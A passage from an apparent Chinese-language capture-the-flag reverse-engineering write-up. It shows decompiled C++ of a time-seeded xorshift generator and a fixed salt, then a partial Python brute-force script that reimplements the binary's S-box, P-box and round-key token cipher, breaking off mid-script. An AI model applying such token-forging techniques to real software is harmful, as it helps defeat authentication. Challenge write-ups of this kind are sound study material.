</span></span><span class=line><span class=cl>    <span class=n>v39</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v58</span><span class=p>,</span> <span class=n>v38</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v40</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;&amp;b=&#34;</span><span class=p>,</span> <span class=n>v39</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v41</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v57</span><span class=p>,</span> <span class=n>v40</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v42</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;&amp;x=&#34;</span><span class=p>,</span> <span class=n>v41</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v43</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v56</span><span class=p>,</span> <span class=n>v42</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v44</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;&amp;y=&#34;</span><span class=p>,</span> <span class=n>v43</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v55</span><span class=p>,</span> <span class=n>v44</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>basic_stringstream</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;::</span><span class=n>str</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v49</span><span class=p>,</span> <span class=n>a4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>basic_stringstream</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;::~</span><span class=n>basic_stringstream</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v45</span><span class=p>,</span> <span class=n>v49</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::~</span><span class=n>string</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v46</span><span class=p>,</span> <span class=n>v51</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>a4</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kr>__int64</span> <span class=nf>gen_rand</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-4h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v1</span> <span class=o>=</span> <span class=p>(((</span><span class=n>dword_14000B040</span> <span class=o>&lt;&lt;</span> <span class=mi>13</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>dword_14000B040</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>17</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>dword_14000B040</span> <span class=o>&lt;&lt;</span> <span class=mi>13</span><span class=p>)</span> <span class=o>^</span> <span class=n>dword_14000B040</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>dword_14000B040</span> <span class=o>=</span> <span class=p>(</span><span class=mi>32</span> <span class=o>*</span> <span class=n>v1</span><span class=p>)</span> <span class=o>^</span> <span class=n>v1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>dword_14000B040</span> <span class=o>&amp;</span> <span class=mh>0x7FFFFFFF</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_1400014B5</span><span class=p>(</span><span class=n>_DWORD</span> <span class=n>a1</span><span class=p>,</span> <span class=n>_DWORD</span> <span class=n>a2</span><span class=p>,</span> <span class=n>_DWORD</span> <span class=n>a3</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>a4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [rsp+10h] [rbp+10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=n>a4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>a4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>v5</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>dword_14000B040</span> <span class=o>=</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>调试可以发现dword_14000B040初始值为get_time返回的time，此外salt值固定为tlkyeueq7fej8vtzitt26yl24kswrgm5，因此a、b、x、y实际上都和t相关</p><p>因此首先我写了个python脚本来爆破（c不擅长，部分函数如sub_14000184D直接让gemini分析生成模拟代码，但事后发现其实没用到）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>math</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span><span class=p>,</span> <span class=n>sha1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gen</span><span class=p>(</span><span class=n>dword</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>v1</span> <span class=o>=</span> <span class=p>((((</span><span class=n>dword</span> <span class=o>&lt;&lt;</span> <span class=mi>13</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>)</span> <span class=o>^</span> <span class=n>dword</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>17</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>dword</span> <span class=o>&lt;&lt;</span> <span class=mi>13</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>)</span> <span class=o>^</span> <span class=n>dword</span>
</span></span><span class=line><span class=cl>    <span class=n>dword</span> <span class=o>=</span> <span class=p>(((</span><span class=mi>32</span> <span class=o>*</span> <span class=n>v1</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>)</span> <span class=o>^</span> <span class=n>v1</span><span class=p>)</span> <span class=o>&amp;</span><span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>dword</span><span class=p>,</span> <span class=n>dword</span> <span class=o>&amp;</span> <span class=mh>0x7FFFFFFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>S_BOX_TABLE_7FF65E2BC020</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x0000000E</span><span class=p>,</span> <span class=mh>0x00000004</span><span class=p>,</span> <span class=mh>0x0000000D</span><span class=p>,</span> <span class=mh>0x00000001</span><span class=p>,</span> <span class=mh>0x00000002</span><span class=p>,</span> <span class=mh>0x0000000F</span><span class=p>,</span> <span class=mh>0x0000000B</span><span class=p>,</span> <span class=mh>0x00000008</span><span class=p>,</span> <span class=mh>0x00000003</span><span class=p>,</span> <span class=mh>0x0000000A</span><span class=p>,</span> <span class=mh>0x00000006</span><span class=p>,</span> <span class=mh>0x0000000C</span><span class=p>,</span> <span class=mh>0x00000005</span><span class=p>,</span> <span class=mh>0x00000009</span><span class=p>,</span> <span class=mh>0x00000000</span><span class=p>,</span> <span class=mh>0x00000007</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>P_BOX_TABLE_7FF65E2BC0A0</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x00000001</span><span class=p>,</span> <span class=mh>0x00000005</span><span class=p>,</span> <span class=mh>0x00000009</span><span class=p>,</span> <span class=mh>0x0000000D</span><span class=p>,</span> <span class=mh>0x00000002</span><span class=p>,</span> <span class=mh>0x00000006</span><span class=p>,</span> <span class=mh>0x0000000A</span><span class=p>,</span> <span class=mh>0x0000000E</span><span class=p>,</span> <span class=mh>0x00000003</span><span class=p>,</span> <span class=mh>0x00000007</span><span class=p>,</span> <span class=mh>0x0000000B</span><span class=p>,</span> <span class=mh>0x0000000F</span><span class=p>,</span> <span class=mh>0x00000004</span><span class=p>,</span> <span class=mh>0x00000008</span><span class=p>,</span> <span class=mh>0x0000000C</span><span class=p>,</span> <span class=mh>0x00000010</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>to_u32</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;将一个数转换为32位无符号整数&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>n</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>to_s32</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;将一个数转换为32位有符号整数&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=n>n</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>n</span> <span class=o>&amp;</span> <span class=mh>0x80000000</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>n</span> <span class=o>-</span> <span class=mh>0x100000000</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_salt</span><span class=p>(</span><span class=n>dword_array</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    对应 C++ 函数 sub_7FF65E2B1518
</span></span></span><span class=line><span class=cl><span class=s2>    根据硬编码的 dword 数组生成一个32字符的 salt 字符串。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>dword_array</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;错误: dword_7FF65E2BB060 数组为空，请填写数据。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>v9</span> <span class=o>=</span> <span class=n>dword_array</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>v10</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># C++ int 是32位的，Python int 是无限精度的，需要模拟32位行为</span>
</span></span><span class=line><span class=cl>        <span class=n>v9_s32</span> <span class=o>=</span> <span class=n>to_s32</span><span class=p>(</span><span class=n>v9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>v9_s32</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>v10</span> <span class=o>=</span> <span class=n>v9_s32</span> <span class=o>/</span> <span class=mi>3</span> <span class=o>+</span> <span class=mi>48</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>v9_s32</span> <span class=o>&gt;=</span> <span class=o>-</span><span class=mi>728</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># ~v9 在C++中是对32位整数按位取反</span>
</span></span><span class=line><span class=cl>            <span class=n>v10</span> <span class=o>=</span> <span class=o>~</span><span class=n>v9_s32</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># 这里的 sub_7FF65E2B31D0 / 1.0986... 被我们分析为 log3</span>
</span></span><span class=line><span class=cl>            <span class=c1># math.log(x) 是 ln(x)，math.log(3) 是 ln(3)</span>
</span></span><span class=line><span class=cl>            <span class=c1># log3(x) = ln(x) / ln(3)</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>log_val</span> <span class=o>=</span> <span class=n>math</span><span class=o>.</span><span class=n>log</span><span class=p>(</span><span class=o>-</span><span class=n>v9_s32</span><span class=p>)</span> <span class=o>/</span> <span class=n>math</span><span class=o>.</span><span class=n>log</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>v10</span> <span class=o>=</span> <span class=n>log_val</span> <span class=o>-</span> <span class=mf>6.0</span> <span class=o>+</span> <span class=mf>48.0</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># 如果 -v9_s32 &lt;= 0，log会出错，这里设置一个默认值</span>
</span></span><span class=line><span class=cl>                <span class=n>v10</span> <span class=o>=</span> <span class=mi>48</span>  <span class=c1># &#39;0&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 将计算结果转换为字符</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>v10</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>s_box_transform</span><span class=p>(</span><span class=n>state</span><span class=p>,</span> <span class=n>s_box_table</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    对应 C++ 函数 sub_7FF65E2B16C1 (S-盒替换)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>s_box_table</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;错误: S_BOX_TABLE_7FF65E2BC020 数组为空，请填写数据。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>to_u32</span><span class=p>(</span><span class=n>state</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># 提取高4位作为索引</span>
</span></span><span class=line><span class=cl>        <span class=n>index</span> <span class=o>=</span> <span class=p>(</span><span class=n>s</span> <span class=o>&gt;&gt;</span> <span class=mi>12</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span>
</span></span><span class=line><span class=cl>        <span class=n>sbox_val</span> <span class=o>=</span> <span class=n>s_box_table</span><span class=p>[</span><span class=n>index</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=c1># (16 * s) 等价于 (s &lt;&lt; 4)</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>sbox_val</span> <span class=o>|</span> <span class=p>(</span><span class=n>s</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>to_u32</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>p_box_transform</span><span class=p>(</span><span class=n>state</span><span class=p>,</span> <span class=n>p_box_table</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    对应 C++ 函数 sub_7FF65E2B1785 (P-盒置换)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>p_box_table</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;错误: P_BOX_TABLE_7FF65E2BC0A0 数组为空，请填写数据。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>to_u32</span><span class=p>(</span><span class=n>state</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>new_state</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># 获取源比特的位置 (C数组是1-based, Python是0-based)</span>
</span></span><span class=line><span class=cl>        <span class=n>source_bit_pos</span> <span class=o>=</span> <span class=n>p_box_table</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=c1># 检查源比特是否为1</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>s</span> <span class=o>&gt;&gt;</span> <span class=n>source_bit_pos</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># 如果是1，则在目标位置i设置比特</span>
</span></span><span class=line><span class=cl>            <span class=n>new_state</span> <span class=o>|=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>new_state</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>round_function</span><span class=p>(</span><span class=n>state</span><span class=p>,</span> <span class=n>s_box_table</span><span class=p>,</span> <span class=n>p_box_table</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    对应 C++ 函数 sub_7FF65E2B17F7 (轮函数)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>state</span> <span class=o>=</span> <span class=n>s_box_transform</span><span class=p>(</span><span class=n>state</span><span class=p>,</span> <span class=n>s_box_table</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>state</span> <span class=o>=</span> <span class=n>p_box_transform</span><span class=p>(</span><span class=n>state</span><span class=p>,</span> <span class=n>p_box_table</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>state</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_round_key</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>round_num</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    对应 C++ 函数 sub_7FF65E2B16A0 (轮密钥生成)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>key_u32</span> <span class=o>=</span> <span class=n>to_u32</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>shift_amount</span> <span class=o>=</span> <span class=mi>4</span> <span class=o>*</span> <span class=p>(</span><span class=n>round_num</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># C++ 代码中 (unsigned int) &gt;&gt; 是逻辑右移</span>
</span></span><span class=line><span class=cl>    <span class=n>shifted_key</span> <span class=o>=</span> <span class=n>key_u32</span> <span class=o>&lt;&lt;</span> <span class=n>shift_amount</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>to_u32</span><span class=p>(</span><span class=n>shifted_key</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encrypt_token</span><span class=p>(</span><span class=n>timestamp</span><span class=p>,</span> <span class=n>r_key</span><span class=p>,</span> <span class=n>s_box_table</span><span class=p>,</span> <span class=n>p_box_table</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
